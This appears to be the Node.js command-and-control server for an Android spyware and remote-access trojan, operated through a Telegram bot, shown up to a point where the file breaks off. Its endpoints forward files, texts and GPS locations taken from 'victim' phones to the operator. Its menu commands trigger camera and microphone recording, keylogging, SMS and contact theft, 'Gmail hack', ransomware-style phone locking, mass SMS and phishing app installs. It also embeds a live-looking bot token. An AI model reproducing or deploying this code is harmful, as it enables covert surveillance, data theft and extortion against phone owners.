const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// ── CONFIG ─────────────────────────────────────────────────────────────────
const token   = '8294314153:AAF7muYdRhziBkOK_ieT7H3Uek25DQlSEYU';
const ownerId = '7861390927';
// Change to your own Render/host URL so the self-ping keeps the server alive
const selfUrl = process.env.SELF_URL || 'https://www.google.com';

// ── SETUP ──────────────────────────────────────────────────────────────────
const app       = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const bot       = new telegramBot(token, { polling: true });
const clients   = new Map(); // uuid → { ws, model, battery, version, brightness, provider }

const upload = multer();
app.use(bodyParser.json());

// Per-device session state (avoids single-global currentUuid race)
// Maps operatorTelegramMsgId → { uuid, title }
const pendingOps = new Map();

let currentUuid  = '';
let currentTitle = '';

// ── HELPERS ────────────────────────────────────────────────────────────────
function sendCmd(uuid, cmd) {
    appSocket.clients.forEach(ws => {
        if (ws.uuid === uuid) ws.send(cmd);
    });
}

function mainMenu() {
    return {
        reply_markup: {
            keyboard: [['📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮'], ['📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬']],
            resize_keyboard: true
        },
        parse_mode: 'HTML'
    };
}

function doneMsg() {
    return '°• 🚽𝐘𝐨𝐮𝐫 𝐖𝐨𝐫𝐤 𝐢𝐬 𝐁𝐞𝐢𝐧𝐠 𝐃𝐨𝐧𝐞, 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝐅𝐨𝐫 𝐀 𝐖𝐡𝐢𝐥𝐞🧭...\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ';
}

async function safeSend(fn) {
    try { return await fn(); }
    catch (e) { console.error('[bot error]', e.message); }
}

// ── HTTP UPLOAD ENDPOINTS ──────────────────────────────────────────────────
app.get('/', (req, res) => {
    res.send('<h1 align="center" style="font-size:18px;color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1><br><p style="font-size:14px;text-align:center;color:red;">Hacking Community➩ @Hidden4_Technical</p>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    safeSend(() => bot.sendDocument(ownerId, req.file.buffer,
        { caption: `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾`, parse_mode: 'HTML' },
        { filename: name, contentType: 'application/octet-stream' }
    ));
    res.send('');
});

app.post('/uploadText', (req, res) => {
    safeSend(() => bot.sendMessage(ownerId,
        `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾\n\n` + req.body['text'],
        { parse_mode: 'HTML' }
    ));
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    safeSend(() => bot.sendLocation(ownerId, req.body['lat'], req.body['lon']));
    safeSend(() => bot.sendMessage(ownerId,
        `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        { parse_mode: 'HTML' }
    ));
    res.send('');
});

// ── WEBSOCKET ──────────────────────────────────────────────────────────────
appSocket.on('connection', (ws, req) => {
    const uuid       = uuid4.v4();
    const model      = req.headers.model      || 'Unknown';
    const battery    = req.headers.battery    || '?';
    const version    = req.headers.version    || '?';
    const brightness = req.headers.brightness || '?';
    const provider   = req.headers.provider   || '?';

    ws.uuid = uuid;
    clients.set(uuid, { ws, model, battery, version, brightness, provider });

    safeSend(() => bot.sendMessage(ownerId,
        `°• 🤡𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄🤡\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        { parse_mode: 'HTML' }
    ));

    ws.on('close', () => {
        clients.delete(uuid);
        safeSend(() => bot.sendMessage(ownerId,
            `°• 😫𝐏𝐇𝐎𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐍𝐄😖\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            { parse_mode: 'HTML' }
        ));
    });
});

// ── BOT: TEXT MESSAGES ─────────────────────────────────────────────────────
bot.on('message', async (message) => {
    const chatId = String(message.chat.id);

    // ── REPLY CHAIN HANDLERS ─────────────────────────────────────────────
    if (message.reply_to_message) {
        const replyText = message.reply_to_message.text || '';

        // send_message step 1: got victim number → ask for message text
        if (replyText.includes('°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️')) {
            pendingOps.set('sms_number', message.text);
            safeSend(() => bot.sendMessage(ownerId,
                '°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲\n\n' +
                '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                { reply_markup: { force_reply: true } }
            ));
        }

        // send_message step 2: got text → fire SMS command
        if (replyText.includes('°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲')) {
            const number = pendingOps.get('sms_number') || '';
            sendCmd(currentUuid, `send_message:${number}/${message.text}`);
            currentUuid = '';
            pendingOps.delete('sms_number');
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // send_message_to_all
        if (replyText.includes('°• 🔄𝐄𝐍𝐓𝐄𝐑 𝐓𝐇𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐓𝐎 𝐒𝐄𝐍𝐃 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒👨‍👩‍👧‍👧')) {
            sendCmd(currentUuid, `send_message_to_all:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // file download path
        if (replyText.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻')) {
            sendCmd(currentUuid, `file:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // delete file path
        if (replyText.includes('°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️')) {
            sendCmd(currentUuid, `delete_file:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // microphone duration
        if (replyText.includes('°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮')) {
            sendCmd(currentUuid, `microphone:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // rec_camera_main duration
        if (replyText.includes('°• 🎢𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐌𝐚𝐢𝐧 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🏠')) {
            sendCmd(currentUuid, `rec_camera_main:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // rec_camera_selfie duration
        if (replyText.includes('°• 🚒𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🚆')) {
            sendCmd(currentUuid, `rec_camera_selfie:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // toast message
        if (replyText.includes('°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️')) {
            sendCmd(currentUuid, `toast:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // show_notification step 1: got title → ask for link
        if (replyText.includes('°• 🦊𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐀𝐩𝐩𝐞𝐚𝐫 𝐀𝐬 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧👹')) {
            currentTitle = message.text;
            safeSend(() => bot.sendMessage(ownerId,
                '°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅\n\n' +
                '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
                { reply_markup: { force_reply: true } }
            ));
        }

        // show_notification step 2: got link → fire
        if (replyText.includes('°• 🐼𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐁𝐞 𝐎𝐩𝐞𝐧𝐞𝐝 𝐛𝐲 𝐓𝐡𝐞 𝐍𝐨𝐭𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 🎅')) {
            sendCmd(currentUuid, `show_notification:${currentTitle}/${message.text}`);
            currentUuid  = '';
            currentTitle = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // play_audio link
        if (replyText.includes('°• 📞𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐀𝐮𝐝𝐢𝐨 𝐋𝐢𝐧𝐤 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐏𝐥𝐚𝐲♑')) {
            sendCmd(currentUuid, `play_audio:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        // custom_phishing APK URL
        if (replyText.includes('°• 🛰️𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐃𝐢𝐫𝐞𝐜𝐭 𝐋𝐢𝐧𝐤 𝐎𝐟 𝐓𝐡𝐞 𝐀𝐏𝐊 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐈𝐧𝐬𝐭𝐚𝐥𝐥📲')) {
            sendCmd(currentUuid, `custom_phishing:${message.text}`);
            currentUuid = '';
            safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        }

        return;
    }

    // ── OWNER COMMANDS ───────────────────────────────────────────────────
    if (chatId !== ownerId) {
        safeSend(() => bot.sendMessage(ownerId, '°• ❌𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐧𝐢𝐞𝐝🚫'));
        return;
    }

    if (message.text === '/start') {
        safeSend(() => bot.sendMessage(ownerId,
            '°•🌹𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑🌷\n\n' +
            '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
            '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ\n\n' +
            '• 🍀 Developer 👉 @Cyb3rS0ldier ⚔️\n\n' +
            '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ, ꜱᴇɴᴅ /start',
            mainMenu()
        ));
    }

    if (message.text === '📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮') {
        if (clients.size === 0) {
            safeSend(() => bot.sendMessage(ownerId,
                '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
            ));
        } else {
            let text = '°• 🎮𝐋𝐢𝐬𝐭 𝐎𝐟 𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 🎞️ :\n\n';
            clients.forEach(v => {
                text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${v.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${v.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${v.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${v.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${v.provider}</b>\n\n`;
            });
            safeSend(() => bot.sendMessage(ownerId, text, { parse_mode: 'HTML' }));
        }
    }

    if (message.text === '📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬') {
        if (clients.size === 0) {
            safeSend(() => bot.sendMessage(ownerId,
                '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
            ));
        } else {
            const keyboard = [];
            clients.forEach((v, key) => {
                keyboard.push([{ text: v.model, callback_data: `device:${key}` }]);
            });
            safeSend(() => bot.sendMessage(ownerId, '°• ⚖️𝐒𝐞𝐥𝐞𝐜𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐅𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞📱', {
                reply_markup: { inline_keyboard: keyboard }
            }));
        }
    }
});

// ── BOT: CALLBACK QUERIES ──────────────────────────────────────────────────
bot.on('callback_query', async (callbackQuery) => {
    const msg     = callbackQuery.message;
    const data    = callbackQuery.data;
    const parts   = data.split(':');
    const commend = parts[0];
    const uuid    = parts[1];

    // ── DEVICE SELECT ──────────────────────────────────────────────────
    if (commend === 'device') {
        const info = clients.get(uuid);
        if (!info) {
            safeSend(() => bot.answerCallbackQuery(callbackQuery.id, { text: 'Device offline' }));
            return;
        }
        safeSend(() => bot.editMessageText(
            `°• 🪣𝐒𝐞𝐥𝐞𝐜𝐭 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐅𝐨𝐫 𝐓𝐡𝐢𝐬 𝐌𝐚𝐜𝐡𝐢𝐧𝐞📬 : <b>${info.model}</b>`,
            {
                chat_id: ownerId, message_id: msg.message_id, parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🍏𝐀𝐏𝐏𝐒🍏',               callback_data: `apps:${uuid}` },
                            { text: '⚽𝐏𝐇𝐎𝐍𝐄 𝐈𝐍𝐅𝐎⚽',         callback_data: `device_info:${uuid}` }
                        ],
                        [
                            { text: '🍫𝐆𝐄𝐓 𝐅𝐢𝐋𝐄🍫',            callback_data: `file:${uuid}` },
                            { text: '🏆𝐃𝐄𝐋𝐄𝐓𝐄 𝐅𝐢𝐋𝐄🏆',          callback_data: `delete_file:${uuid}` }
                        ],
                        [
                            { text: '🧨𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓🧨',          callback_data: `screenshot:${uuid}` },
                            { text: '☎️𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆☎️',          callback_data: `whatsapp:${uuid}` }
                        ],
                        [
                            { text: '⛄𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃⛄',           callback_data: `clipboard:${uuid}` },
                            { text: '🥤𝐒𝐎𝐔𝐍𝐃 𝐑𝐄𝐂𝐎𝐑𝐃🥤',         callback_data: `microphone:${uuid}` }
                        ],
                        [
                            { text: '📸𝐁𝐀𝐂𝐊 𝐏𝐇𝐎𝐓𝐎📷',           callback_data: `camera_main:${uuid}` },
                            { text: '🚸𝐅𝐑𝐎𝐍𝐓 𝐏𝐇𝐎𝐓𝐎🚸',          callback_data: `camera_selfie:${uuid}` }
                        ],
                        [
                            { text: '🎥𝐁𝐀𝐂𝐊 𝐑𝐄𝐂𝐎𝐑𝐃🎥',          callback_data: `rec_camera_main:${uuid}` },
                            { text: '🤳𝐅𝐑𝐎𝐍𝐓 𝐑𝐄𝐂𝐎𝐑𝐃🤳',          callback_data: `rec_camera_selfie:${uuid}` }
                        ],
                        [
                            { text: '📟𝐋𝐢𝐕𝐄 𝐆𝐏𝐒📟',             callback_data: `location:${uuid}` },
                            { text: '🖥️𝐄𝐂𝐇𝐎 𝐒𝐌𝐒🖥️',             callback_data: `toast:${uuid}` }
                        ],
                        [
                            { text: '🥃𝐂𝐎𝐎𝐊𝐈𝐄🥃',              callback_data: `Settings:${uuid}` },
                            { text: '🍁𝐆𝐌𝐀𝐈𝐋 𝐇𝐀𝐂𝐊🍁',           callback_data: `Erase_data:${uuid}` }
                        ],
                        [
                            { text: '🎻𝐂𝐀𝐋𝐋 𝐇𝐢𝐒𝐓𝐎𝐑𝐘🎻',          callback_data: `calls:${uuid}` },
                            { text: '♐𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐋𝐢𝐒𝐓♐',          callback_data: `contacts:${uuid}` }
                        ],
                        [
                            { text: '🚳𝐕𝐢𝐁𝐑𝐀𝐓𝐄🚳',             callback_data: `vibrate:${uuid}` },
                            { text: '🏖️𝐍𝐎𝐓𝐢-𝐅𝐢𝐂𝐀𝐓𝐢𝐎𝐍🏖️',        callback_data: `show_notification:${uuid}` }
                        ],
                        [
                            { text: '📺𝐒𝐌𝐒 𝐋𝐢𝐒𝐓📺',             callback_data: `messages:${uuid}` },
                            { text: '🛍️𝐒𝐌𝐒 𝐒𝐄𝐍𝐃🛍️',             callback_data: `send_message:${uuid}` }
                        ],
                        [
                            { text: '🌋𝐏𝐑𝐢𝐕𝐀𝐓𝐄 𝐏𝐢𝐜🌋',           callback_data: `Ransomware:${uuid}` },
                            { text: '🛰️𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐀𝐏𝐏🛰️',           callback_data: `custom_phishing:${uuid}` }
                        ],
                        [
                            { text: '🌀𝐒𝐓𝐀𝐑𝐓 𝐒𝐎𝐔𝐍𝐃🌀',           callback_data: `play_audio:${uuid}` },
                            { text: '🎹𝐒𝐓𝐎𝐏 𝐒𝐎𝐔𝐍𝐃🎹',            callback_data: `stop_audio:${uuid}` }
                        ],
                        [
                            { text: '🚦𝐒𝐄𝐍𝐃 𝐒𝐌𝐒 𝐓𝐎 𝐀𝐋𝐋 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒🚦', callback_data: `send_message_to_all:${uuid}` }
                        ],
                        [
                            { text: '🏟️𝐏𝐇𝐎𝐍𝐄 𝐋𝐎𝐂𝐊🏟️',            callback_data: `encrypt_data:${uuid}` },
                            { text: '🏛️𝐔𝐍𝐋𝐎𝐂𝐊 𝐏𝐇𝐎𝐍𝐄🏛️',           callback_data: `decrypt_data:${uuid}` }
                        ],
                        [
                            { text: '🛒𝐊𝐄𝐘𝐋𝐎𝐆𝐆𝐄𝐑 𝐎𝐍🛒',          callback_data: `keylogger_on:${uuid}` },
                            { text: '🪆𝐊𝐄𝐘𝐋𝐎𝐆𝐆𝐄𝐑 𝐎𝐅𝐅🪆',          callback_data: `keylogger_off:${uuid}` }
                        ]
                    ]
                }
            }
        ));
        return;
    }

    // ── SIMPLE ONE-SHOT COMMANDS (no input needed) ─────────────────────
    const simpleCommands = [
        'calls', 'contacts', 'messages', 'apps', 'device_info',
        'clipboard', 'camera_main', 'camera_selfie', 'location',
        'vibrate', 'stop_audio', 'screenshot', 'whatsapp',
        'Settings', 'Erase_data', 'Ransomware',
        'encrypt_data', 'decrypt_data', 'keylogger_on', 'keylogger_off'
    ];

    if (simpleCommands.includes(commend)) {
        sendCmd(uuid, commend);
        safeSend(() => bot.deleteMessage(ownerId, msg.message_id));
        safeSend(() => bot.sendMessage(ownerId, doneMsg(), mainMenu()));
        return;
    }

    // ── COMMANDS NEEDING INPUT ─────────────────────────────────────────
    currentUuid = uuid;
    safeSend(() => bot.deleteMessage(ownerId, msg.message_id));

    const inputPrompts = {
        file: '°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻\n\n• ᴇxᴀᴍᴘʟᴇ: <b>DCIM/Camera</b> ꜰᴏʀ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ',
        delete_file: '°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️\n\n• ᴇxᴀᴍᴘʟᴇ: <b>DCIM/Camera</b>',
        microphone: '°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮\n\n• ᴇɴᴛᴇʀ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ꜱᴇᴄᴏɴᴅꜱ',
        rec_camera_main: '°• 🎢𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐌𝐚𝐢𝐧 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🏠\n\n• ᴇɴᴛᴇʀ ᴅᴜʀᴀᴛɪᴏɴ ɪɴ ꜱᴇᴄᴏɴᴅꜱ',
        rec_camera_selfie: '°• 🚒𝐄𝐧𝐭𝐞𝐫 𝐇𝐨𝐰 𝐋𝐨𝐧𝐠 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐡𝐞 𝐒𝐞𝐥𝐟𝐞 𝐂𝐚𝐦𝐞𝐫𝐚 𝐓𝐨 𝐁𝐞 𝐑𝐞𝐜𝐨𝐫𝐝𝐞𝐝🚆\n\n• ᴇɴᴛᴇʀ ᴅᴜʀᴀᴛɪᴏɴ ɪɴ ꜱᴇᴄᴏɴᴅꜱ',
        toast: '°• 🎒𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐒𝐌𝐒 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐡𝐨𝐰 𝐨𝐧 𝐘𝐨𝐮𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 𝐃𝐞𝐯𝐢𝐜𝐞☂️\n\n• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ꜰᴏʀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
